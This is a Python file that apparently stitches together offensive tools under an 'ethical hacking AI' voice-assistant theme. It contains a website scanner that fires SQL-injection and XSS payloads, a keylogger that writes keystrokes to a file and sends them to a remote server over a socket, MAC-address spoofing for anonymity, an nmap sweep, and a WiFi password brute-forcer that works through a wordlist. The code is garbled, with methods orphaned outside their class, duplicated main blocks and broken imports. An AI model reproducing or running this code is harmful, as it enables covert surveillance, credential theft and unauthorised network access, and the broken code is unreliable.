import requests
from bs4 import BeautifulSoup
import os
import pynput
from pynput.keyboard import Key, Listener
import socket
import threading
import speech_recognition as sr
import subprocess
import time
import asyncio
import pandas as pd
from celery import Celery
from sklearn.ensemble import RandomForestClassifier
from scapy.all import sniff

import pywifi
from pywifi import const
import time


# Function to recognize voice input
def take_command():
    recognizer = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        recognizer.adjust_for_ambient_noise(source)
        audio = recognizer.listen(source)

    try:
        print("Recognizing...")
        command = recognizer.recognize_google(audio)
        print(f"You said: {command}")
        return command
    except sr.UnknownValueError:
        print("Sorry, I could not understand the audio.")
        return None
    except sr.RequestError:
        print("Sorry, the speech recognition service is down.")
        return None



class satan:
    def __init__(self, target_url):
        self.target_url = target_url

    def scan_open_directories(self):
        common_directories = [
            "admin", "login", "uploads", "backup", "config", "logs", "tmp"
        ]
        for directory in common_directories:
            url = f"{self.target_url}/{directory}"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Found open directory: {directory}")
            elif response.status_code == 403:
                print(f"[!] Access denied for directory: {directory}")

    def scan_common_files(self):
        common_files = [
            "robots.txt", "sitemap.xml", ".git", "README.md", "config.php"
        ]
        for file in common_files:
            url = f"{self.target_url}/{file}"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Found common file: {file}")
            elif response.status_code == 403:
                print(f"[!] Access denied for file: {file}")

    def scan_website(self):
        print(f"[*] Scanning website: {self.target_url}")
        self.scan_open_directories()
        self.scan_common_files()

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    ethical_hacking_ai = satan(target_url)
    ethical_hacking_ai.scan_website()

def scan_sql_injection(self):
    test_payload = "' OR '1'='1"
    url = f"{self.target_url}/?id={test_payload}"
    response = requests.get(url)
    if "syntax error" in response.text.lower() or "unexpected" in response.text.lower():
        print(f"[!] Potential SQL Injection vulnerability found at {url}")
    else:
        print(f"[+] No SQL Injection vulnerability found at {url}")

def scan_website(self):
    print(f"[*] Scanning website: {self.target_url}")
    self.scan_open_directories()
    self.scan_common_files()
    self.scan_sql_injection()
    self.scan_xss()
    self.check_outdated_software()
    self.analyze_http_headers()

def scan_xss(self):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
    ]
    for payload in xss_payloads:
        url = f"{self.target_url}/search?q={payload}"
        response = requests.get(url)
        if payload in response.text:
            print(f"[!] Potential XSS vulnerability found at {url}")
        else:
            print(f"[+] No XSS vulnerability found at {url}")

def scan_vulnerabilities(self):
    print(f"[*] Scanning for vulnerabilities at {self.target_url}")
    self.scan_open_directories()
    self.scan_common_files()
    self.scan_sql_injection()
    self.scan_xss()

def main():
    target_url = input("Enter the target URL: ")
    ethical_hacking_ai = satan(target_url)
    ethical_hacking_ai.scan_vulnerabilities()

if __name__ == "__main__":
    main()

def check_outdated_software(self):
    response = requests.get(self.target_url)
    headers = response.headers
    if 'server' in headers:
        print(f"[*] Server: {headers['server']}")
    if 'x-powered-by' in headers:
        print(f"[*] Powered by: {headers['x-powered-by']}")
    if 'x-aspnet-version' in headers:
        print(f"[*] ASP.NET Version: {headers['x-aspnet-version']}")

def analyze_http_headers(self):
    response = requests.get(self.target_url)
    headers = response.headers
    security_headers = [
        'Content-Security-Policy', 'X-Content-Type-Options',
        'X-Frame-Options', 'Strict-Transport-Security'
    ]
    for header in security_headers:
        if header not in headers:
            print(f"[!] Missing security header: {header}")
        else:
            print(f"[+] Found security header: {header}")

    def scan_open_directories(self):
        open_directories = [
            "admin", "administrator", "config", "configuration", "conf",
            "controlpanel", "cpanel", "db", "database", "debug", "dev",
            "developer", "docs", "download", "downloads", "ftp", "images",
            "img", "include", "includes", "install", "installer", "lib",
            "libs", "license", "log", "logs", "mail", "mails", "media",
            "modules", "mysql", "phpmyadmin", "plugins", "public", "resources",
            "scripts", "secure", "security", "setup", "site", "sites",
            "src", "static", "styles", "themes", "tmp", "upload", "uploads",
            "user", "users", "var", "www"
        ]
        for directory in open_directories:
            url = f"{self.target_url}/{directory}"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[!] Open directory found: {url}")

    def scan_common_files(self):
        common_files = [
            "robots.txt", "sitemap.xml", "README.md", "LICENSE.txt",
            "CHANGELOG.txt", "CONTRIBUTING.md", "favicon.ico", "humans.txt",
            "crossdomain.xml", "web.config", "htaccess.txt", "404.html",
            "500.html"  
        ]    
        for file in common_files:
            url = f"{self.target_url}/{file}"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[!] Common file found: {url}")

import query
import sys
if "exit" in query:
    print(f"exiting ...")
    sys.exit(1)

else:
    print(f"pls say what we should do sir")

# Configuration
LOG_FILE = 'keylog.txt'
SERVER_IP = '192.168.1.100'  # Replace with your server's IP
SERVER_PORT = 12345

def log_key(key):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f'{key.char}')
        send_log()
    except AttributeError:
        if key == Key.space:
            with open(LOG_FILE, 'a') as f:
                f.write(' ')
        elif key == Key.backspace:
            with open(LOG_FILE, 'a') as f:
                f.write('[BACKSPACE]')
        elif key == Key.enter:
            with open(LOG_FILE, 'a') as f:
                f.write('\n')
        send_log()

def send_log():
    with open(LOG_FILE, 'r') as f:
        log_data = f.read()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(log_data.encode())
            print("Log sent to server")
    except Exception as e:
        print(f"Error sending log: {e}")

def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

def start_server_thread():
    threading.Thread(target=start_keylogger, daemon=True).start()

if __name__ == '__main__':
    start_server_thread()
    print(f"keylogger has been started on {SERVER_IP}:{SERVER_PORT}")


def scan_network():
    print("Scanning network for nearby devices...")
    result = subprocess.run(["nmap", "-sn", "192.168.1.0/24"], capture_output=True, text=True)
    print(result.stdout)
    return result.stdout

# Function to send a message to a target device
def send_message(target_ip, port, message):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target device
        sock.connect((target_ip, port))
        
        # Send the message
        sock.send(message.encode())
        print(f"Message sent to {target_ip}:{port}")
        
        # Close the connection
        sock.close()
    except Exception as e:
        print(f"Failed to send message to {target_ip}:{port}: {e}")

# Function to spoof MAC address (optional)
def spoof_mac_address(interface="eth0"):
    print("Spoofing MAC address...")
    subprocess.run(["sudo", "macchanger", "-r", interface])

# Main function
def main():
    # Optional: Spoof MAC address for anonymity
    spoof_mac_address()

    # Scan the network for nearby devices
    scan_network()

    # Take voice input from the user
    message = take_command()
    if not message:
        print("No message detected. Exiting...")
        return

    # Target device IP and port
    target_ip = input("Enter the target device IP: ")  # Replace with the target device's IP
    port = int(input("Enter the target port: "))       # Replace with an open port on the target device

    # Send the message
    send_message(target_ip, port, message)

if __name__ == "__main__":
    main()



def escalate_issue(issue):
    # Define the logic to escalate the issue
    print(f"Escalating issue: {issue}")
    
# Load your dataset
data = pd.read_csv('network_traffic.csv')
X = data.drop('label', axis=1)
y = data['label']


# Initialize Celery
app = Celery('tasks', broker='pyamqp://guest@localhost//')

# Function to detect threats
def detect_threats(new_data):
    clf = RandomForestClassifier()
    clf.fit(X, y)
    predictions = clf.predict(new_data)
    return predictions

# Function to analyze traffic
def analyze_traffic(data):
    summary = data.describe()
    return summary

# Real-time monitoring
async def monitor_network():
    def packet_callback(packet):
        # Process the packet
        print(packet.summary())
        # Optionally, add a task to the queue
        escalate_issue.delay({'issue': 'High-priority alert'})

    sniff(prn=packet_callback, store=0)

# Main function
async def main():
    # Load your dataset
    data = pd.read_csv('network_traffic.csv')
    X = data.drop('label', axis=1)
    y = data['label']

    # Start monitoring
    await monitor_network()

    # Detect threats in new data
    new_data = pd.read_csv('new_traffic.csv')
    predictions = detect_threats(new_data)
    print(predictions)

    # Analyze traffic
    summary = analyze_traffic(data)
    print(summary)

# Run the main function
asyncio.run(main())

def connect_to_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.cipher = const.CIPHER_TYPE_WPAPSK
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    iface.connect(profile)

    time.sleep(10)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    return False

def crack_wifi(ssid, password_file):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if connect_to_wifi(ssid, password):
                print(f"Password found: {password}")
                return
        print("Password not found in the list.")

if __name__ == "__main__":
    ssid = "your_ssid"
    password_file = "password_list.txt" ### YOU GOTTA create a password.txt in the same file path of the code  ######## 
    crack_wifi(ssid, password_file)
